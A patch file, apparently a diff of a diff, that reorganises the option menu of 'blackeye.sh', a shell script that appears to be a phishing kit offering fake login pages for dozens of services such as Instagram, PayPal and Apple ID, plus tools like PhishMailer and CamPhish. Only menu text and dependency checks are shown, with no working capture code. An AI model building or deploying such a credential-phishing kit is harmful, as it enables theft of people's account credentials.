@@ -1,9 +1,9 @@
 diff -ru --color old/blackeye.sh new/blackeye.sh
---- old/blackeye.sh	2020-12-19 21:16:48.990415929 +0100
-+++ new/blackeye.sh	2020-12-19 21:34:52.926612866 +0100
-@@ -9,43 +9,25 @@
- # TrapControl
+--- old/blackeye.sh	2020-12-23 17:03:37.649271510 +0100
++++ new/blackeye.sh	2020-12-23 17:15:21.359560981 +0100
+@@ -10,28 +10,10 @@
  trap 'printf "\n";stop;exit 1' 2
+ 
  
 -# Ensure system knows where blackeye directory was installed.
 -if [[ ! -f '~/.local/.be_dir' ]]; then
@@ -31,6 +31,7 @@ diff -ru --color old/blackeye.sh new/blackeye.sh
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }
  }
+@@ -43,27 +25,27 @@
  
  # Option Menu
  menu(){
@@ -43,19 +44,30 @@ diff -ru --color old/blackeye.sh new/blackeye.sh
 -  echo -e "          ${BC}07${AC} Origin ${NC}          ${BC}23${AC} MySpace ${NC}        ${BC}**${AC} Extra Tools ${NC}"
 -  echo -e "          ${BC}08${AC} Yahoo ${NC}           ${BC}24${AC} Badoo ${NC}          ${BC}39${AC} CamPhish ${NC}"
 -  echo -e "          ${BC}09${AC} LinkedIn ${NC}        ${BC}25${AC} VK ${NC}             ${BC}40${AC} LostPass ${NC}"
+-  echo -e "          ${BC}10${AC} Protonmail ${NC}      ${BC}26${AC} Yandex ${NC}         ${BC}41${AC} PhishMailer ${NC}"
+-  echo -e "          ${BC}11${AC} Wordpress ${NC}       ${BC}27${AC} DevianART ${NC}      ${BC}42${AC} HackerPro ${NC}"
+-  echo -e "          ${BC}12${AC} Microsoft ${NC}       ${BC}28${AC} Wi-Fi ${NC}      "       #${BC}01${AC} ?? ${NC}
+-  echo -e "          ${BC}13${AC} IGFollowers ${NC}     ${BC}29${AC} PayPal ${NC}      "      #${BC}01${AC} ?? ${NC}
+-  echo -e "          ${BC}14${AC} Pinterest ${NC}       ${BC}30${AC} Steam ${NC}      "       #${BC}01${AC} ?? ${NC}
+-  echo -e "          ${BC}15${AC} Apple ID ${NC}        ${BC}31${AC} Bitcoin ${NC}      "     #${BC}01${AC} ?? ${NC}
+-  echo -e "          ${BC}16${AC} Verizon ${NC}         ${BC}32${AC} Playstation ${NC}      " #${BC}01${AC} ?? ${NC}
 +  echo -e "          ${BC} 1${AC} Instagram ${NC}       ${BC}17${AC} DropBox ${NC}        ${BC}33${AC} eBay ${NC}"
 +  echo -e "          ${BC} 2${AC} FaceBook ${NC}        ${BC}18${AC} Adobe ID ${NC}       ${BC}34${AC} Amazon ${NC}"
 +  echo -e "          ${BC} 3${AC} SnapChat ${NC}        ${BC}19${AC} Shopify ${NC}        ${BC}35${AC} iCloud ${NC}"
 +  echo -e "          ${BC} 4${AC} Twitter ${NC}         ${BC}20${AC} Messenger ${NC}      ${BC}36${AC} Spotify ${NC}"
 +  echo -e "          ${BC} 5${AC} Github ${NC}          ${BC}21${AC} GitLab ${NC}         ${BC}37${AC} Netflix ${NC}"
 +  echo -e "          ${BC} 6${AC} Google ${NC}          ${BC}22${AC} Twitch ${NC}         ${BC}38${AC} Custom ${NC}"
-+  echo -e "          ${BC} 7${AC} Origin ${NC}          ${BC}23${AC} MySpace ${NC}        ${BC}**${AC} Extra Tools ${NC}"
-+  echo -e "          ${BC} 8${AC} Yahoo ${NC}           ${BC}24${AC} Badoo ${NC}          ${BC}39${AC} CamPhish ${NC}"
-+  echo -e "          ${BC} 9${AC} LinkedIn ${NC}        ${BC}25${AC} VK ${NC}             ${BC}40${AC} LostPass ${NC}"
-   echo -e "          ${BC}10${AC} Protonmail ${NC}      ${BC}26${AC} Yandex ${NC}         ${BC}41${AC} PhishMailer ${NC}"
-   echo -e "          ${BC}11${AC} Wordpress ${NC}       ${BC}27${AC} DevianART ${NC}      ${BC}42${AC} HackerPro ${NC}"
-   echo -e "          ${BC}12${AC} Microsoft ${NC}       ${BC}28${AC} Wi-Fi ${NC}      "       #${BC}01${AC} ?? ${NC}
-@@ -57,7 +39,7 @@
++  echo -e "          ${BC} 7${AC} Origin ${NC}          ${BC}23${AC} MySpace ${NC}"
++  echo -e "          ${BC} 8${AC} Yahoo ${NC}           ${BC}24${AC} Badoo ${NC}"
++  echo -e "          ${BC} 9${AC} LinkedIn ${NC}        ${BC}25${AC} VK ${NC}             ${BC}**${AC} Extra Tools : ${NC}"
++  echo -e "          ${BC}10${AC} Protonmail ${NC}      ${BC}26${AC} Yandex ${NC}         CAUTION: those might install"
++  echo -e "          ${BC}11${AC} Wordpress ${NC}       ${BC}27${AC} DevianART ${NC}      applications system-wide, by-"
++  echo -e "          ${BC}12${AC} Microsoft ${NC}       ${BC}28${AC} Wi-Fi ${NC}          passing your package manager !"
++  echo -e "          ${BC}13${AC} IGFollowers ${NC}     ${BC}29${AC} PayPal ${NC}         ${BC}39${AC} CamPhish ${NC}"
++  echo -e "          ${BC}14${AC} Pinterest ${NC}       ${BC}30${AC} Steam ${NC}          ${BC}40${AC} LostPass ${NC}"
++  echo -e "          ${BC}15${AC} Apple ID ${NC}        ${BC}31${AC} Bitcoin ${NC}        ${BC}41${AC} PhishMailer ${NC}"
++  echo -e "          ${BC}16${AC} Verizon ${NC}         ${BC}32${AC} Playstation ${NC}    ${BC}42${AC} HackerPro ${NC}"
+ 
    read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
  
    # Ngrok Auth Validation
